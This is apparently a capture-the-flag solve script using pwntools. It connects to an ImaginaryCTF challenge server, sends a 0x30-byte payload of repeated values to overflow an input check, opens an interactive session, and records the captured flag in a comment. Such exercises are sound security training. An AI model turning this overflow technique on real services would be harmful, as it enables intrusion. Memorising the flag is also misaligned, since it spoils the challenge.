from pwn import *
io = remote("chal.imaginaryctf.org",42001)
payload = p64(0x69637466)*(0x30//8)
io.sendline(payload)
io.interactive()

#ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
